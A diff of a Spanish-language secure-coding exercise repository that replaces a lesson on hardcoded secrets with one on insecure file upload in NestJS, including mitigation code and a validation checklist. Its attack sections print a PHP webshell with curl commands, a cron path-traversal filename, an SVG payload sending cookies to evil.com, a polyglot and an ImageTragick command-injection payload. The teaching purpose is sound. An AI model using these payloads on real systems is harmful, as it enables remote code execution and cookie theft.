@@ -1,204 +1,286 @@
-# Paso 19 — Hardcoded Secrets
-**Tecnologia:** TypeScript / NestJS | **OWASP:** A02:2021 - Cryptographic Failures | **CWE-798**
+# Paso 20 — Insecure File Upload
+**Tecnologia:** TypeScript / NestJS | **OWASP:** A04:2021 - Insecure Design / A01:2021 | **CWE-434**
 
 ---
 
 ## Que es esta vulnerabilidad?
 
-Hardcoded Secrets ocurre cuando credenciales, claves criptograficas, tokens o contrasenas se escriben directamente en el codigo fuente. El problema fundamental es que el codigo fuente es compartido: entre desarrolladores, en repositorios (incluyendo GitHub), en builds, en contenedores Docker y en backups.
+Insecure File Upload ocurre cuando una aplicacion acepta archivos del usuario sin validar correctamente el tipo, el tamano, el contenido o el nombre del archivo. Las consecuencias pueden incluir:
 
-A diferencia de una contrasena de usuario que puede cambiarse, un secreto hardcodeado en el historial de git es permanente: aunque se elimine en un commit posterior, sigue siendo accesible en los commits anteriores. Herramientas como `git log`, `git show` o servicios como GitGuardian o TruffleHog escanean repositorios buscando patrones de secretos.
-
-Según el State of Secrets Sprawl 2023 de GitGuardian, se detectan mas de 10 millones de secretos hardcodeados en repositorios publicos de GitHub cada ano. Las consecuencias van desde acceso no autorizado a APIs de pago (coste economico directo) hasta robo de datos de usuarios y clientes.
+- **RCE (Remote Code Execution):** subir un archivo `.php`, `.jsp` o `.py` en un servidor que ejecuta scripts, y luego acceder a el via URL para ejecutar codigo.
+- **Path Traversal via nombre:** subir un archivo con nombre `../../etc/cron.d/backdoor` que se guarda fuera del directorio previsto.
+- **XSS via SVG/HTML:** subir un archivo SVG con JavaScript embebido que se ejecuta en el navegador de otros usuarios.
+- **DoS por disco lleno:** subir archivos de tamano arbitrario hasta agotar el espacio en disco del servidor.
+- **Malware hosting:** usar el servidor como repositorio de malware que se sirve a terceros.
 
 ---
 
 ## Donde ocurre en este codigo?
 
-**Archivo:** `src/typescript/src/config.service.ts`
+**Archivo:** `src/typescript/src/upload.controller.ts`
 
 ```typescript
 // CODIGO VULNERABLE — estado actual del ejercicio
-const JWT_SECRET = 'super-secret-key-hardcoded-123';  // en el historial de git para siempre
-const DB_PASSWORD = 'admin1234';                       // visible para todos los desarrolladores
-const STRIPE_KEY = 'sk_live_hardcoded_key_abc123';     // clave de produccion en el codigo
-
-@Injectable()
-export class ConfigService {
-  get jwtSecret(): string { return JWT_SECRET; }
-  get dbPassword(): string { return DB_PASSWORD; }
-  get stripeKey(): string { return STRIPE_KEY; }
+@Controller('files')
+export class UploadController {
+  @Post('/upload')
+  @UseInterceptors(FileInterceptor('file'))
+  upload(@UploadedFile() file: Express.Multer.File): { filename: string } {
+    return { filename: file.originalname };  // nombre original del usuario, sin validacion
+  }
 }
 ```
 
-Cualquier desarrollador que haga `git clone` o `git log` tiene acceso a `sk_live_hardcoded_key_abc123`, una clave de Stripe de produccion que permite hacer cargos y acceder a datos de clientes.
+Problemas:
+1. **Sin validacion de MIME type ni extension:** se acepta cualquier tipo de archivo
+2. **Sin limite de tamano:** el archivo puede ser de cualquier tamano
+3. **Se retorna `file.originalname`:** el nombre original del atacante se devuelve y potencialmente se usa para guardar el archivo
+4. **Sin generacion de nombre seguro:** si el archivo se guarda con el nombre original, hay path traversal
 
 ---
 
 ## Como lo explotaria un atacante
 
-**Busqueda en repositorios publicos:**
+**Subida de webshell PHP:**
 ```bash
-# GitHub Search: buscar patrones de claves Stripe en repos publicos
-sk_live_ in:file
-# Encuentra miles de claves validas en repositorios publicos
+# Crear una webshell PHP
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+curl -X POST /files/upload -F 'file=@shell.php'
+# Si el servidor sirve el directorio de uploads como estatico:
+curl 'https://app.empresa.com/uploads/shell.php?cmd=id'
+# El servidor ejecuta: uid=33(www-data)
 ```
 
-**Extraccion del historial de git:**
+**Path traversal via nombre de archivo:**
 ```bash
-# Incluso si el secreto fue "borrado" en un commit posterior
-git log --all --full-history -- config.service.ts
-git show <commit-hash>:src/typescript/src/config.service.ts
-# El secreto sigue visible en el historial
+# El cliente puede controlar el nombre del archivo
+curl -X POST /files/upload \
+  -F 'file=@evil.sh;filename=../../../../etc/cron.d/backdoor'
+# Si el servidor guarda con el nombre original: sobrescribe el cron
 ```
 
-**Escaneo automatizado:**
+**XSS via SVG:**
+```xml
+<!-- evil.svg -->
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>document.location='https://evil.com/steal?c='+document.cookie</script>
+</svg>
+```
 ```bash
-# TruffleHog escanea el historial completo buscando patrones de secretos
-trufflehog git file://.
-# Detecta: SK_LIVE, AKIA (AWS), ghp_ (GitHub), etc.
+curl -X POST /files/upload -F 'file=@evil.svg'
+# Si otro usuario accede a la URL del archivo SVG, el JS se ejecuta en su navegador
 ```
 
-**Acceso via Docker image:**
+**DoS por disco lleno:**
 ```bash
-# Si el codigo se incluye en una imagen Docker publica
-docker pull empresa/api:latest
-docker run empresa/api cat /app/src/config.service.js  # secretos en texto plano
+# Crear un archivo de 10GB y subirlo
+dd if=/dev/urandom of=bigfile bs=1M count=10000
+curl -X POST /files/upload -F 'file=@bigfile'
+# El disco del servidor se llena, el servicio cae
 ```
 
 ---
 
 ## Tu tarea: aplicar la mitigacion
 
-Modifica `src/typescript/src/config.service.ts` para leer secretos desde variables de entorno y fallar al arranque si faltan:
+Modifica `src/typescript/src/upload.controller.ts` para validar tipo, tamano y generar un nombre seguro:
 
 ```typescript
 // CODIGO SEGURO
-import { Injectable } from '@nestjs/common';
+import {
+  Controller, Post, UploadedFile, UseInterceptors, BadRequestException
+} from '@nestjs/common';
+import { FileInterceptor } from '@nestjs/platform-express';
+import { randomUUID } from 'crypto';
+import * as path from 'path';
 
-// Leer un secreto obligatorio desde entorno. Falla al arrancar si no esta definido.
-function requireEnv(name: string): string {
-  const value = process.env[name];
-  if (!value) {
-    // Fallar en startup es correcto: mejor no arrancar que operar sin secretos
-    throw new Error(`Variable de entorno requerida no esta definida: ${name}`);
+// Tipos MIME permitidos (lista blanca, no lista negra)
+const ALLOWED_MIME_TYPES = new Set([
+  'image/jpeg',
+  'image/png',
+  'image/gif',
+  'image/webp',
+  'application/pdf',
+]);
+
+// Extensiones permitidas (mapeadas desde MIME)
+const ALLOWED_EXTENSIONS = new Set(['.jpg', '.jpeg', '.png', '.gif', '.webp', '.pdf']);
+
+// Limite de tamano: 5 MB
+const MAX_FILE_SIZE = 5 * 1024 * 1024;
+
+@Controller('files')
+export class UploadController {
+  @Post('/upload')
+  @UseInterceptors(FileInterceptor('file', {
+    limits: { fileSize: MAX_FILE_SIZE },  // limite de tamano en multer
+  }))
+  upload(@UploadedFile() file: Express.Multer.File): { filename: string } {
+    if (!file) {
+      throw new BadRequestException('No se recibio ningun archivo');
+    }
+
+    // Validar MIME type reportado por multer
+    if (!ALLOWED_MIME_TYPES.has(file.mimetype)) {
+      throw new BadRequestException(`Tipo de archivo no permitido: ${file.mimetype}`);
+    }
+
+    // Validar extension del nombre original
+    const ext = path.extname(file.originalname).toLowerCase();
+    if (!ALLOWED_EXTENSIONS.has(ext)) {
+      throw new BadRequestException(`Extension no permitida: ${ext}`);
+    }
+
+    // Validar tamano (aunque multer ya limita, verificacion adicional)
+    if (file.size > MAX_FILE_SIZE) {
+      throw new BadRequestException('Archivo demasiado grande');
+    }
+
+    // Generar nombre aleatorio: evita path traversal y colisiones
+    const safeFilename = `${randomUUID()}${ext}`;
+
+    // Aqui se guardaria el archivo con safeFilename, no con file.originalname
+    // fs.writeFileSync(path.join('/var/uploads', safeFilename), file.buffer);
+
+    return { filename: safeFilename };
   }
-  return value;
-}
-
-@Injectable()
-export class ConfigService {
-  // Los secretos se resuelven al instanciar el servicio (al arranque de la app)
-  readonly jwtSecret: string = requireEnv('JWT_SECRET');
-  readonly dbPassword: string = requireEnv('DB_PASSWORD');
-  readonly stripeKey: string = requireEnv('STRIPE_API_KEY');
 }
 ```
 
 ### Por que funciona esta mitigacion?
 
-- **Variables de entorno:** los secretos existen solo en el entorno de ejecucion, no en el codigo. No aparecen en `git log`, no van en imagenes Docker, no se comparten con el repositorio.
-- **`requireEnv` que falla al arranque:** si falta una variable de entorno critica, la aplicacion no arranca. Esto es el comportamiento correcto: es mejor un error obvio en startup que operar silenciosamente sin autenticacion JWT o con credenciales incorrectas.
-- **Separacion de codigo y configuracion:** el codigo define que secreto necesita pero no su valor. El valor se inyecta desde el entorno (Kubernetes Secrets, AWS Secrets Manager, HashiCorp Vault, `.env` local en desarrollo).
+- **`ALLOWED_MIME_TYPES` (allowlist):** en lugar de bloquear tipos peligrosos (lista negra, facil de evadir), solo se permiten los tipos estrictamente necesarios. Un archivo `.php` tiene MIME `application/x-php` o `text/plain`, ninguno en la lista.
+- **`ALLOWED_EXTENSIONS` (allowlist):** validacion de extension adicional. Un archivo `shell.php.jpg` tendra extension `.jpg`, pero `file.mimetype` sera `application/x-php`, fallando la validacion de MIME.
+- **`randomUUID()`:** el nombre del archivo almacenado es un UUID aleatorio. No hay relacion con el nombre original del atacante. Previene path traversal y sobreescritura de archivos existentes.
+- **`limits: { fileSize: MAX_FILE_SIZE }`:** multer rechaza el archivo antes de procesarlo completo si supera el limite, previniendo DoS por disco.
 
 ---
 
-## Variantes de la misma categoria (Cryptographic Failures via Secrets — mas complejas)
+## Variantes de la misma categoria (Insecure Design / Upload — mas complejas)
 
-### Variante A: Secretos en archivos .env commiteados al repositorio
+### Variante A: Polyglot Files (archivos que son validos en dos formatos)
 
-```bash
-# .gitignore correcto pero .env fue commitado antes de anadirlo al .gitignore
-$ git log --all -- .env
-commit abc123 Author: dev@empresa.com
-    "Add initial config"
-    +DATABASE_URL=postgres://admin:S3cr3tP4ss@prod-db.empresa.com/mydb
-    +STRIPE_SECRET_KEY=sk_live_abc123xyz
-```
-
-El `.env` fue borrado del working directory pero sigue en el historial.
+Un archivo polyglot es valido en dos formatos simultaneamente. Por ejemplo, un archivo puede ser tanto un JPEG valido como un PHP ejecutable:
 
 ```bash
-# Mitigacion: borrar el archivo del historial completo de git
-git filter-branch --force --index-filter \
-  'git rm --cached --ignore-unmatch .env' \
-  --prune-empty --tag-name-filter cat -- --all
-# Revocar e invalidar todos los secretos expuestos inmediatamente
-# Los secretos en historial se consideran comprometidos aunque se eliminen
+# Crear un polyglot JPEG/PHP
+# El JPEG magic bytes al inicio satisfacen la validacion de imagen
+# El codigo PHP al final se ejecuta si el servidor lo procesa como PHP
+printf '\xff\xd8\xff\xe0' > polyglot.jpg  # magic bytes de JPEG
+echo '<?php system($_GET["cmd"]); ?>' >> polyglot.jpg
+
+# file polyglot.jpg: JPEG image data
+# Si se sube como imagen y se ejecuta como PHP: RCE
 ```
 
----
+```typescript
+// MITIGACION ADICIONAL: verificar magic bytes del contenido real
+import * as fileType from 'file-type';
 
-### Variante B: Secretos en variables de entorno de CI/CD expuestos en logs
-
-```yaml
-# VULNERABLE — imprimir variables de entorno en CI logs
-- name: Debug environment
-  run: env  # imprime TODAS las variables de entorno, incluyendo secretos
-
-# O accidentalmente:
-- name: Build
-  run: npm run build -- --verbose
-  env:
-    STRIPE_KEY: ${{ secrets.STRIPE_KEY }}
-# Si el build falla y imprime argv, STRIPE_KEY puede aparecer en los logs
-```
-
-```yaml
-# SEGURO — usar secrets de GitHub Actions / GitLab CI correctamente
-- name: Build
-  run: npm run build
-  env:
-    STRIPE_KEY: ${{ secrets.STRIPE_KEY }}  # GitHub enmascara el valor en logs
-# Nunca imprimir secrets con echo, env, o --verbose que exponga argumentos
+async uploadSecure(file: Express.Multer.File) {
+  const type = await fileType.fromBuffer(file.buffer);
+  if (!type || !ALLOWED_MIME_TYPES.has(type.mime)) {
+    throw new BadRequestException('Contenido del archivo no coincide con el tipo declarado');
+  }
+  // file-type lee los magic bytes reales del buffer, no el MIME del cliente
+}
 ```
 
 ---
 
-### Variante C: Secretos hardcodeados en imagenes Docker via ARG
+### Variante B: ImageMagick / FFmpeg procesamiento de archivos maliciosos (ImageTragick)
 
-```dockerfile
-# VULNERABLE — secreto pasado como ARG queda en las capas de la imagen
-FROM node:18-alpine
-ARG STRIPE_KEY
-ENV STRIPE_KEY=$STRIPE_KEY  # persiste en cada capa de la imagen
-COPY . .
-RUN npm install
+```typescript
+// VULNERABLE — procesar imagenes sin validar el contenido
+@Post('/resize')
+async resizeImage(file: Express.Multer.File) {
+  // ImageMagick < 6.9.3-9 procesaba directivas MVG/SVG que ejecutaban comandos
+  await execFile('convert', [file.path, '-resize', '100x100', output]);
+}
 ```
 
-```bash
-# El secreto es visible en los metadatos de la imagen
-docker inspect empresa/api:latest | grep -i stripe
-# O en el historial de capas:
-docker history empresa/api:latest --no-trunc
+Un archivo con extension `.jpg` pero contenido MVG:
+```
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/"|id > /tmp/rce")'
+pop graphic-context
 ```
 
-```dockerfile
-# SEGURO — nunca pasar secretos como ARG/ENV en tiempo de build
-# Los secretos se inyectan en tiempo de ejecucion via el orquestador
-FROM node:18-alpine
-COPY . .
-RUN npm install
-CMD ["node", "dist/main.js"]
-# Al ejecutar: docker run -e STRIPE_KEY=... empresa/api
-# O en Kubernetes: usar secretos de k8s montados como variables de entorno
+```typescript
+// SEGURO — usar sharp (libreria nativa Node.js sin dependencia de ImageMagick)
+import sharp from 'sharp';
+
+@Post('/resize')
+async resizeImage(file: Express.Multer.File) {
+  const output = path.join('/var/uploads', randomUUID() + '.jpg');
+  await sharp(file.buffer)
+    .resize(100, 100)
+    .jpeg({ quality: 80 })
+    .toFile(output);  // sharp rechaza archivos que no son imagenes validas
+  return { filename: path.basename(output) };
+}
+```
+
+---
+
+### Variante C: Upload a almacenamiento en la nube sin politica de acceso
+
+```typescript
+// VULNERABLE — subir a S3 con ACL public-read sin validacion
+async uploadToS3(file: Express.Multer.File) {
+  await s3.upload({
+    Bucket: 'empresa-uploads',
+    Key: file.originalname,  // nombre controlado por el atacante
+    Body: file.buffer,
+    ACL: 'public-read',      // cualquiera en internet puede descargarlo
+    ContentType: file.mimetype,  // MIME reportado por el cliente, no verificado
+  }).promise();
+  return { url: `https://empresa-uploads.s3.amazonaws.com/${file.originalname}` };
+}
+```
+
+```typescript
+// SEGURO — nombre generado, ACL privada, MIME verificado
+async uploadToS3(file: Express.Multer.File) {
+  const detectedType = await fileType.fromBuffer(file.buffer);
+  if (!detectedType || !ALLOWED_MIME_TYPES.has(detectedType.mime)) {
+    throw new BadRequestException('Tipo de archivo no valido');
+  }
+  const safeKey = `uploads/${randomUUID()}${path.extname(file.originalname).toLowerCase()}`;
+  await s3.upload({
+    Bucket: 'empresa-uploads',
+    Key: safeKey,
+    Body: file.buffer,
+    ACL: 'private',              // no publico por defecto
+    ContentType: detectedType.mime,  // MIME verificado del contenido real
+  }).promise();
+  // Devolver una URL pre-firmada con expiracion, no la URL publica
+  const signedUrl = await s3.getSignedUrlPromise('getObject', {
+    Bucket: 'empresa-uploads',
+    Key: safeKey,
+    Expires: 3600,  // URL valida por 1 hora
+  });
+  return { url: signedUrl };
+}
 ```
 
 ---
 
 ## Referencias
 
-- [OWASP A02:2021 - Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
-- [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
-- [GitGuardian - State of Secrets Sprawl 2023](https://www.gitguardian.com/state-of-secrets-sprawl)
-- [OWASP Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)
+- [OWASP A04:2021 - Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)
+- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
+- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
+- [CVE-2016-3714 - ImageTragick](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3714)
 
 ---
 
 ## Lo que valida el workflow automaticamente
 
-El workflow **Validate Step 19** exige que `src/typescript/src/config.service.ts` contenga:
-- `process.env[name]`
-- `requireEnv`
-- `STRIPE_API_KEY`
-- La ausencia de secretos hardcodeados conocidos
+El workflow **Validate Step 20** exige que `src/typescript/src/upload.controller.ts` contenga:
+- `ALLOWED_MIME_TYPES`
+- `ALLOWED_EXTENSIONS`
+- `randomUUID`
+- `fileSize`
+- La ausencia de `return { filename: file.originalname }`
